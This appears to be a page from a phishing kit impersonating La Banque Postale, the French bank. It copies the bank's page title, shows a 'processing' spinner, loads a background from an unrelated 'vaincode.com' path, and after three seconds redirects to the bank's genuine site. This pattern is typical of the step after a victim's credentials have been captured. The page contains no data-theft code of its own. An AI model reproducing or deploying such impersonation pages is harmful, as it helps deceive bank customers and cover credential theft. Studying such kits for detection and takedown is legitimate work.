<html>
<head>
<title>Banque - banque en ligne - La Banque Postale – La Banque Postale</title>
	<link type="image/x-icon" href="./img/favicon.png" rel="shortcut icon">
	<meta http-equiv="refresh" content="3;url=https://www.labanquepostale.fr/particulier/jeunes.html" />
<style>
body
{
	background-color: #FDFDFD ;
	background-image: url('../../vaincode.com/a/img/2.html');
	background-attachment: fixed;
    background-position: top; 
	
    background-repeat: no-repeat;
	background-size: 100%;
}
.div1
{
    position: absolute;
	margin-top: -108px;
	margin-left: -180px;
	left: 50%;
	width: 360px;
	top: 50%;
	height: 360px;
	opacity: 1;
	border-radius: 20px	;
	overflow:hidden;
	font-family: "Helvetica Neue";
	font-weight: 300;
	font-size: 15px;
	line-height: 1.2;
	align: center;
}
.process
{	margin-top: -20px;
	margin-left: 90px;
	height: 220px;
}
</style>
	
</head>
<body>
<form>
	<div class="div1">
	<img src="./img/process.gif" class="process" />
	</div>
</form>
</body>

</html>
